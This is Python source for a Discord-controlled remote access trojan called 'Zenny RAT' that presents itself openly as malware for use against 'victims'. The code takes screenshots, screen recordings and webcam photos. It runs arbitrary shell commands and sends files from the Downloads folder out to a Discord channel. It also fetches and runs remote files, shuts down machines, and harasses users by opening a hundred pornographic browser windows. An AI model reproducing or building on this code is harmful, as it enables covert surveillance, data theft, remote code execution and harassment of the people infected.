import os
import cv2
import discord
import asyncio
import ctypes
import psutil
import requests
import datetime
import platform
import numpy as np
import subprocess
import webbrowser
import pyautogui
import socket
import pyperclip
import pygame
from PIL import ImageGrab
from io import BytesIO
from discord import File
from discord.ext import commands

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='.', intents=intents, help_command=None)

config = {
    'token': "%token%",
    'server_id': '%id%'
}

sessions = {}

@bot.event
async def errorerror(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send("Command doesn't exist :skull:")
        

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    await bot.change_presence(activity=discord.Game(name="Zenny RAT Version 0.1 | made by synthetic#3681"))

    server = bot.get_guild(int(config['server_id']))
    if server:
        category = discord.utils.get(server.categories, name='Sessions')
        if not category:
            category = await server.create_category_channel('Sessions')

        pcn = socket.gethostname().lower()

        session = discord.utils.get(category.channels, name=pcn)
        if session:
            sessions[pcn] = session
            print(f"Reconnected to session '{pcn}' in {category.name}'.")
        else:
            session = await category.create_text_channel(pcn)
            sessions[pcn] = session
            print(f"New session '{pcn}' created in {category.name}'.")

        embed = discord.Embed(
            title="Zenny Rat Connected" if session else "Zenny Rat Reconnected",
            description=f"Your Session Key is {pcn} :white_check_mark:",
            color=discord.Color.green()
        )
        await session.send(embed=embed) if session else None
    else:
        print("Server not found.")



@bot.command()
async def help(ctx):
    message = """```
Remote Desktop:

  .screenshot <sessionkey>: Takes a screenshot of the user's PC
  .record <sessionkey>: Records the user's screen for 30 seconds
  .webcam <sessionkey>: Captures a picture from the user's webcam

------------------------------------------------------------------------------------------

Information Gathering:

  .time <sessionkey>: Retrieves the user's date and time
  .Ipinfo <sessionkey>: Retrieves the user's IP information
  .sysinfo <sessionkey>: Retrieves the user's system information
  .usage <sessionkey>: Tells you the users disk and cpu usage

------------------------------------------------------------------------------------------

Remote Shell Commands:

  .shell <session> <command>: Executes a command on the victim's computer

------------------------------------------------------------------------------------------

File Management:

  .website <sessionkey> <https://example.com>: Sends the user to a website of choice
  .getdownloads <sessionkey>: Gets all Users files in downloads folder
  .download <sessionkey>: Can download any file in their downloads folder

------------------------------------------------------------------------------------------

System Control:

  .restart <sessionkey>: Restarts the user's computer
  .shutdown <sessionkey>: Shuts down the user's computer

------------------------------------------------------------------------------------------

Malware Commands

  .upload <session> <filelink>: Uploads and downloads file and then runs it on victims pc
  .startup <session>: COMING SOON

------------------------------------------------------------------------------------------
```
"""
    message2 = """```
Troll Commands:
  
  .furryporn <session>: this spams furry porn browsers on victims browser to flood their history
  .fork <session>: forkbombs their computer using simple batch script
  .rickroll <session>: rickrolls their computer for 30 seconds and they cannot escape
  .music <session> <file_attachment>: plays music on their computer
  .bluescreen <session>: COMING SOON.

------------------------------------------------------------------------------------------
```
"""

    await ctx.send(message)
    await ctx.send(message2)


@bot.command()
async def screenshot(ctx, seshn: str):
    session = sessions.get(seshn)
    if session:
        screenshot = pyautogui.screenshot()
        screenshot.save(f'{seshn}.png')
        await ctx.send(f"Screenshot", file=discord.File(f'{seshn}.png'))
    else:
        pass

@bot.command()
async def time(ctx, seshn: str):
    session = sessions.get(seshn)
    if session:
        ctime = datetime.datetime.now().strftime("%H:%M:%S")
        cdate = datetime.date.today().strftime("%Y-%m-%d")
        await ctx.send(f"The users current time > {ctime}")
        await ctx.send(f"The users current date > {cdate}")
    else:
        pass

@bot.command()
async def ipinfo(ctx, seshn: str):
    session = sessions.get(seshn)
    if session:
        url = "http://ipinfo.io/json"
        response = requests.get(url)
        data = response.json()

        embed = discord.Embed(title="Xen Rat - IP LOG", description="IP INFO", color=discord.Color.purple())
        embed.add_field(name=":globe_with_meridians: IP", value=f"```{data['ip']}```", inline=False)
        embed.add_field(name=":house: City", value=f"```{data['city']}```", inline=True)
        embed.add_field(name=":map: Region", value=f"```{data['region']}```", inline=True)
        embed.add_field(name=":earth_americas: Country", value=f"```{data['country']}```", inline=True)
        embed.add_field(name=":briefcase: Organization", value=f"```{data['org']}```", inline=False)

        await ctx.send(embed=embed)
    else:
        pass

@bot.command()
async def sysinfo(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        si = platform.uname()

        embed = discord.Embed(title="System Information", color=discord.Color.purple())
        embed.add_field(name="System", value=f"```{si.system}```", inline=False)
        embed.add_field(name="Node Name", value=f"```{si.node}```", inline=True)
        embed.add_field(name="Release", value=f"```{si.release}```", inline=True)
        embed.add_field(name="Version", value=f"```{si.version}```", inline=True)
        embed.add_field(name="Machine", value=f"```{si.machine}```", inline=True)
        embed.add_field(name="Processor", value=f"```{si.processor}```", inline=True)

        await session.send(embed=embed)
    else:
        pass

@bot.command()
async def recorddesk(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        await ctx.send("Recording started")

        # Start recording
        start = datetime.datetime.now()
        duration = datetime.timedelta(seconds=30)
        frames = []

        while datetime.datetime.now() - start < duration:
            img = ImageGrab.grab()
            frames.append(cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR))

            await asyncio.sleep(0.1)

        height, width, _ = frames[0].shape
        outputf = "screen.mp4"
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        videow = cv2.VideoWriter(outputf, fourcc, 10, (width, height))

        for frame in frames:
            videow.write(frame)
        videow.release()

        await ctx.send("Recording completed")
        await ctx.send(file=discord.File(outputf))
        os.remove(outputf)
    else:
        pass

@bot.command()
async def errorbox(ctx, seshn: str, *, message: str):
    session = sessions.get(seshn.lower())
    if session:
        await ctx.send("Sent Errorbox whoopty Doo!")
        ctypes.windll.user32.MessageBoxW(None, message, "Error", 0)
        await ctx.send("They saw the error message.")
    else:
        pass

@bot.command()
async def website(ctx, seshn: str, websiteu: str):
    session = sessions.get(seshn.lower())
    if session:
        try:
            webbrowser.open(websiteu)

            await ctx.send(f"opened Website")
        except webbrowser.Error:
            await ctx.send("Failed")
    else:
        pass

@bot.command()
async def shutdown(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        try:
            os.system("shutdown /s /t 0")

            await ctx.send(f"Computer Shutdown")
        except os.OSError:
            await ctx.send("Failed")
    else:
        pass

@bot.command()
async def restart(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        try:
            os.system("shutdown /r /t 0")

            await ctx.send(f"Computer Restarted")
        except os.OSError:
            await ctx.send("Failed")
    else:
        pass


@bot.command()
async def webcam(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        cap = cv2.VideoCapture(0)

        if not cap.isOpened():
            await ctx.send("Failed")
            return

        ret, frame = cap.read()

        if not ret:
            await ctx.send("Failed.")
            return
        output = "webcam.jpg"
        cv2.imwrite(output, frame)
        await session.send("", file=discord.File(output))
        os.remove(output)
        cap.release()
    else:
        pass

@bot.command()
async def shell(ctx, seshn: str, *, command: str):
    session = sessions.get(seshn.lower())
    if session:
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
            with open("output.txt", "w") as file:
                file.write(output)
            await session.send(file=discord.File("output.txt"))
            os.remove("output.txt")
        except subprocess.CalledProcessError as e:
            pass
    else:
        pass

@bot.command()
async def usage(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        disku = psutil.disk_usage("/")
        totaldick = round(disku.total / (1024 ** 3), 2)
        useddick = round(disku.used / (1024 ** 3), 2)
        dickperc = disku.percent

        cpuperc = psutil.cpu_percent()

        embed = discord.Embed(title="System Usage", color=discord.Color.purple())
        embed.add_field(name="Session", value=seshn, inline=False)
        embed.add_field(name="Disk", value=f"```{useddick} GB / {totaldick} GB ({dickperc}%)```", inline=False)
        embed.add_field(name="CPU", value=f"```{cpuperc}%```", inline=False)

        await session.send(embed=embed)
    else:
        pass

@bot.command()
async def upload(ctx, seshn: str, filel: str):
    session = sessions.get(seshn.lower())
    if session:
        if not filel.startswith("https://cdn.discordapp.com/attachments/"):
            await ctx.send("Invalid link. It must be a Discord attachment download link.")
            return
        
        try:
            response = requests.get(filel)
            if response.status_code == 200:
                filen = filel.split("/")[-1]
                filep = f"./{filen}"
                with open(filep, "wb") as file:
                    file.write(response.content)

                try:
                    subprocess.Popen(["start", filep], shell=True)
                except subprocess.SubprocessError:
                    await ctx.send("Failed to run the file.")
                else:
                    await ctx.send("File has been run.")
            else:
                await ctx.send("Failed to download the file.")
        except requests.exceptions.RequestException:
            await ctx.send("Error occurred during download.")
    else:
        pass

@bot.command()
async def getdownloads(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        downloadf = os.path.expanduser("~\\Downloads")
        files = os.listdir(downloadf)
        if not files:
            await session.send("No files found")
            return

        filel = "\n".join(files)
        with open("CdriveDownload.txt", "w", encoding="utf-8") as file:
            file.write(filel)

        await session.send("", file=discord.File("CdriveDownload.txt"))
        os.remove("CdriveDownload.txt")
    else:
        pass

@bot.command()
async def download(ctx, seshn: str, filename: str):
    session = sessions.get(seshn.lower())
    if session:
        download = os.path.expanduser("~\\Downloads")
        file = os.path.join(download, filename)
        if os.path.isfile(file):
            await session.send(f"Downloaded..", file=discord.File(file))
        else:
            pass
    else:
        pass

@bot.command()
async def music(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        if len(ctx.message.attachments) == 0:
            await ctx.send("Invalid file Please send an MP3 file in the message not a link or anything")
            return

        attachment = ctx.message.attachments[0]
        if not attachment.filename.endswith('.mp3'):
            await ctx.send("Invalid file extension")
            return

        download = os.path.join(os.getcwd(), attachment.filename)
        await attachment.save(download)
        pygame.mixer.init()
        try:
            pygame.mixer.music.load(download)
            await session_channel.send("Playing Music...")
            pygame.mixer.music.play()

            playb = asyncio.create_task(con(pygame.mixer.music))

            while not playb.done():
                await bot.process_commands(ctx.message)
        finally:
            pygame.mixer.music.stop()
            pygame.mixer.quit()
            os.remove(download)

        await session_channel.send("Finished playing the music.")
    else:
        pass

async def con(music_player):
    while music_player.get_busy():
        await asyncio.sleep(1)
    music_player.stop()

@bot.command()
async def furryporn(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        website = "https://www.pornhub.com/view_video.php?viewkey=63d567c6732bd"
        windows = 100
        for _ in range(windows):
            webbrowser.open(website)
        await session_channel.send("Opening furryporn...")
    else:
        pass

@bot.command()
async def rickroll(ctx, seshn):
    session = sessions.get(seshn.lower())
    if session:
        videou = "https://cdn.discordapp.com/attachments/1113634742731026432/1113644870570090547/Rick_Astley_-_Never_Gonna_Give_You_Up_Official_Music_Video.mp4"
        response = requests.get(videou)
        with open('video.mp4', 'wb') as file:
            file.write(response.content)
        videop = subprocess.Popen(['start', 'video.mp4'], shell=True)
        await ctx.send("Rickrolled victim :)")
        await asyncio.sleep(30)   
        videop.terminate()
        os.remove('video.mp4')
    else:
        pass



@bot.command()
async def fork(ctx, seshn):
    session = sessions.get(seshn.lower())
    if session:
        command = "echo hello"
        os.system(command)
        await ctx.send(f"Forkbombed session :rofl:")
    else:
        pass

bot.run(config['token'])

